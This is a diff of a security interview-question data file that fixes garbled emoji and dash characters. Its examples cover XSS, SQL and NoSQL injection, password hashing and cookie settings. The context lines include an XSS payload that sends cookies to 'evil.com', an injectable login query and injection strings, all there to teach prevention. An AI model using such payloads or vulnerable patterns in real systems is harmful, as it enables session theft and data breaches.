@@ -13,7 +13,7 @@ export const securityInterviewQuestions: InterviewQuestion[] = [
     example: {
       code: `// VULNERABLE code
 const username = req.query.name;
-// âŒ Directly injecting user input into HTML
+// ❌ Directly injecting user input into HTML
 res.send('<h1>Hello ' + username + '</h1>');
 // If name = <script>document.location='http://evil.com/steal?c='+document.cookie</script>
 // Other users see the page, their cookies are stolen!
@@ -29,9 +29,9 @@ const escapeHtml = (str) => str
 res.send('<h1>Hello ' + escapeHtml(username) + '</h1>');
 
 // PREVENTION 2: Use textContent not innerHTML
-// âŒ Dangerous
+// ❌ Dangerous
 element.innerHTML = userInput;
-// âœ… Safe
+// ✅ Safe
 element.textContent = userInput;
 
 // PREVENTION 3: Content Security Policy (CSP) header
@@ -50,7 +50,7 @@ res.cookie('session', token, {
 function Safe({ userInput }) {
   return <div>{userInput}</div>; // React escapes this automatically
 }
-// âŒ But this is dangerous in React:
+// ❌ But this is dangerous in React:
 function Unsafe({ userInput }) {
   return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
 }`,
@@ -157,14 +157,14 @@ fetch('/api/transfer', {
     question: 'What is SQL Injection and how do you prevent it?',
     difficulty: 'intermediate',
     tags: ['sql-injection', 'security', 'database'],
-    shortAnswer: 'SQL Injection lets attackers manipulate database queries by injecting SQL code through user input. Prevent with parameterized queries/prepared statements â€” never concatenate user input into SQL.',
+    shortAnswer: 'SQL Injection lets attackers manipulate database queries by injecting SQL code through user input. Prevent with parameterized queries/prepared statements — never concatenate user input into SQL.',
     detailedExplanation: 'SQL Injection occurs when user input is concatenated directly into SQL queries. An attacker can terminate the query early, append their own SQL, comment out the rest, dump data, or bypass authentication. Classic example: entering \' OR \'1\'=\'1 in a login form. Prevention: parameterized queries (prepared statements) pass data separately from SQL structure, so it can never be interpreted as SQL.',
     example: {
       code: `// VULNERABLE code
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
   
-  // âŒ String concatenation - DANGEROUS!
+  // ❌ String concatenation - DANGEROUS!
   const query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
   db.query(query);
   
@@ -177,30 +177,30 @@ app.post('/login', (req, res) => {
   // Deletes entire users table!
 });
 
-// âœ… PREVENTION 1: Parameterized queries (SQL/MySQL)
+// ✅ PREVENTION 1: Parameterized queries (SQL/MySQL)
 const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
 db.query(query, [username, password]); // Data passed separately
 
-// âœ… PREVENTION 2: Prepared statements (PostgreSQL)
+// ✅ PREVENTION 2: Prepared statements (PostgreSQL)
 const { rows } = await pool.query(
   'SELECT * FROM users WHERE username = $1 AND password = $2',
   [username, password]
 );
 
-// âœ… PREVENTION 3: ORM (Mongoose, Sequelize, Prisma)
+// ✅ PREVENTION 3: ORM (Mongoose, Sequelize, Prisma)
 // ORMs use parameterized queries internally
 const user = await User.findOne({ username, password });
 
 // MongoDB is NOT immune - NoSQL injection is possible
-// âŒ Vulnerable
+// ❌ Vulnerable
 const user = await User.findOne({ username: req.body.username });
 // If req.body.username = { $gt: "" } -> matches all users!
 
-// âœ… Safe - validate input type
+// ✅ Safe - validate input type
 const username = String(req.body.username); // Force string
 const user = await User.findOne({ username });
 
-// âœ… Express-validator for input validation
+// ✅ Express-validator for input validation
 const { body, validationResult } = require('express-validator');
 
 app.post('/login', [
@@ -309,7 +309,7 @@ app.use(helmet()); // Sets HSTS, X-Frame-Options, CSP, etc.
     question: 'How should passwords be stored securely?',
     difficulty: 'intermediate',
     tags: ['passwords', 'bcrypt', 'hashing'],
-    shortAnswer: 'Never store plain text passwords. Hash with bcrypt, Argon2, or PBKDF2 â€” algorithms designed to be slow. Salt prevents rainbow table attacks. Verify by hashing the attempt and comparing hashes.',
+    shortAnswer: 'Never store plain text passwords. Hash with bcrypt, Argon2, or PBKDF2 — algorithms designed to be slow. Salt prevents rainbow table attacks. Verify by hashing the attempt and comparing hashes.',
     detailedExplanation: 'Plain text storage: immediate breach exposure. MD5/SHA1: too fast, attackers can compute billions of hashes/second. bcrypt/Argon2/PBKDF2 are designed to be computationally expensive and adjustable. Salt is random data added before hashing, making identical passwords produce different hashes, preventing rainbow table attacks. Work factor controls how slow the hash is - increase over time as hardware improves.',
     example: {
       code: `const bcrypt = require('bcrypt');
@@ -341,7 +341,7 @@ app.post('/api/login', async (req, res) => {
   const user = await User.findOne({ email });
   
   if (!user) {
-    // âš ï¸ Same response for missing user vs wrong password
+    // ⚠️ Same response for missing user vs wrong password
     // Prevents username enumeration attacks
     return res.status(401).json({ error: 'Invalid credentials' });
   }
@@ -368,7 +368,7 @@ const sha256 = crypto.createHash('sha256').update(password).digest('hex');
 // SHA256 without salt/slow work factor is insecure!`,
       language: 'javascript'
     },
-    interviewAnswer: 'The rule is: never store passwords in plain text, never use fast hash algorithms like MD5 or SHA256. I use bcrypt with a cost factor of 12 â€” it\'s intentionally slow so brute-force attacks take years. bcrypt automatically handles salting, so identical passwords produce different hashes. I return the same error message for wrong email and wrong password to prevent username enumeration attacks.',
+    interviewAnswer: 'The rule is: never store passwords in plain text, never use fast hash algorithms like MD5 or SHA256. I use bcrypt with a cost factor of 12 — it\'s intentionally slow so brute-force attacks take years. bcrypt automatically handles salting, so identical passwords produce different hashes. I return the same error message for wrong email and wrong password to prevent username enumeration attacks.',
     commonMistakes: [
       'Using MD5 or SHA1 for passwords',
       'Forgetting to salt (allows rainbow table attacks)',
@@ -471,8 +471,8 @@ app.use(helmet({
     question: 'What is input validation and sanitization? Why is it important?',
     difficulty: 'beginner',
     tags: ['validation', 'sanitization', 'security'],
-    shortAnswer: 'Validation checks if input meets expected format (length, type, pattern). Sanitization cleans input by removing or encoding dangerous characters. Both are needed â€” validate first, then sanitize.',
-    detailedExplanation: 'Never trust user input. Validation ensures data is in the expected format before processing. Sanitization transforms input to remove dangerous content. These prevent XSS, SQL injection, and NoSQL injection. Use validation libraries like Joi, Yup, or express-validator. Validate on both client (UX) and server (security). Server validation is mandatory â€” client validation can be bypassed.',
+    shortAnswer: 'Validation checks if input meets expected format (length, type, pattern). Sanitization cleans input by removing or encoding dangerous characters. Both are needed — validate first, then sanitize.',
+    detailedExplanation: 'Never trust user input. Validation ensures data is in the expected format before processing. Sanitization transforms input to remove dangerous content. These prevent XSS, SQL injection, and NoSQL injection. Use validation libraries like Joi, Yup, or express-validator. Validate on both client (UX) and server (security). Server validation is mandatory — client validation can be bypassed.',
     example: {
       code: `// express-validator
 const { body, param, query, validationResult } = require('express-validator');
@@ -532,7 +532,7 @@ const mongoSanitize = require('express-mongo-sanitize');
 app.use(mongoSanitize()); // Strips $ and . from req.body`,
       language: 'javascript'
     },
-    interviewAnswer: 'Input validation and sanitization is defense in depth. Validation ensures data is in the expected format â€” email is an email, age is a number, name isn\'t 10,000 characters. Sanitization removes dangerous content. I validate on both frontend (better UX) and backend (actual security). express-validator makes this clean with declarative rules. I also use express-mongo-sanitize to prevent NoSQL injection attempts.',
+    interviewAnswer: 'Input validation and sanitization is defense in depth. Validation ensures data is in the expected format — email is an email, age is a number, name isn\'t 10,000 characters. Sanitization removes dangerous content. I validate on both frontend (better UX) and backend (actual security). express-validator makes this clean with declarative rules. I also use express-mongo-sanitize to prevent NoSQL injection attempts.',
     commonMistakes: [
       'Only validating on the frontend (easily bypassed)',
       'Not validating data type (number vs string)',
@@ -628,7 +628,7 @@ app.post('/api/login', async (req, res) => {
 });`,
       language: 'javascript'
     },
-    interviewAnswer: 'Brute force protection layers several defenses. Rate limiting is the first â€” I use express-rate-limit scoped to the email address, not just IP (VPNs bypass IP limits). Account lockout adds another layer after repeated failures. I show a CAPTCHA after 3 failed attempts. Most importantly, I recommend users enable MFA â€” even if an attacker guesses the password, they can\'t get in without the second factor.',
+    interviewAnswer: 'Brute force protection layers several defenses. Rate limiting is the first — I use express-rate-limit scoped to the email address, not just IP (VPNs bypass IP limits). Account lockout adds another layer after repeated failures. I show a CAPTCHA after 3 failed attempts. Most importantly, I recommend users enable MFA — even if an attacker guesses the password, they can\'t get in without the second factor.',
     commonMistakes: [
       'Rate limiting by IP only (VPN bypass)',
       'Infinite lockout that can be used as DoS attack on accounts',
@@ -672,7 +672,7 @@ require('dotenv').config(); // Must be first line
 const jwtSecret = process.env.JWT_SECRET;
 const dbUrl = process.env.DATABASE_URL;
 
-// âŒ Never do this
+// ❌ Never do this
 const jwtSecret = 'hardcoded-secret-in-code'; // In git = compromised!
 
 // Validate required env vars on startup
@@ -714,7 +714,7 @@ async function getSecret(secretName) {
 }`,
       language: 'javascript'
     },
-    interviewAnswer: 'Secret management is critical and commonly overlooked. I always add .env to .gitignore before the first commit â€” once committed, secrets live in git history forever even after deletion. In development, I use .env files. In production, I use the platform\'s built-in secret management â€” Vercel environment variables, AWS Secrets Manager, or Kubernetes Secrets. I also provide a .env.example with all keys but no values so new developers know what\'s needed.',
+    interviewAnswer: 'Secret management is critical and commonly overlooked. I always add .env to .gitignore before the first commit — once committed, secrets live in git history forever even after deletion. In development, I use .env files. In production, I use the platform\'s built-in secret management — Vercel environment variables, AWS Secrets Manager, or Kubernetes Secrets. I also provide a .env.example with all keys but no values so new developers know what\'s needed.',
     commonMistakes: [
       'Committing .env files to git',
       'Using the same secrets in development and production',
@@ -798,7 +798,7 @@ app.get('/api/me', (req, res) => {
 });`,
       language: 'javascript'
     },
-    interviewAnswer: 'Cookie security attributes are three simple settings that prevent major attacks. HttpOnly stops XSS attacks from stealing session tokens â€” even if an attacker injects script, it can\'t read the cookie. Secure prevents transmission over plain HTTP. SameSite=Strict prevents CSRF attacks because cross-site requests don\'t include the cookie. I always set all three for any cookie that stores authentication data.',
+    interviewAnswer: 'Cookie security attributes are three simple settings that prevent major attacks. HttpOnly stops XSS attacks from stealing session tokens — even if an attacker injects script, it can\'t read the cookie. Secure prevents transmission over plain HTTP. SameSite=Strict prevents CSRF attacks because cross-site requests don\'t include the cookie. I always set all three for any cookie that stores authentication data.',
     commonMistakes: [
       'Not setting HttpOnly (allows XSS to steal sessions)',
       'Not setting Secure in production (transmits over HTTP)',
@@ -895,7 +895,7 @@ app.get('/auth/callback', async (req, res) => {
 });`,
       language: 'javascript'
     },
-    interviewAnswer: 'OAuth 2.0 is the standard for "Login with Google/GitHub". The key insight is that your application never sees the user\'s Google password â€” Google authenticates them and returns a token you can use to access their profile. Always use PKCE in public clients (SPAs, mobile) to prevent authorization code interception. The state parameter prevents CSRF attacks on the OAuth flow itself.',
+    interviewAnswer: 'OAuth 2.0 is the standard for "Login with Google/GitHub". The key insight is that your application never sees the user\'s Google password — Google authenticates them and returns a token you can use to access their profile. Always use PKCE in public clients (SPAs, mobile) to prevent authorization code interception. The state parameter prevents CSRF attacks on the OAuth flow itself.',
     commonMistakes: [
       'Skipping PKCE for public clients (authorization code interception)',
       'Not validating the state parameter (CSRF vulnerability)',
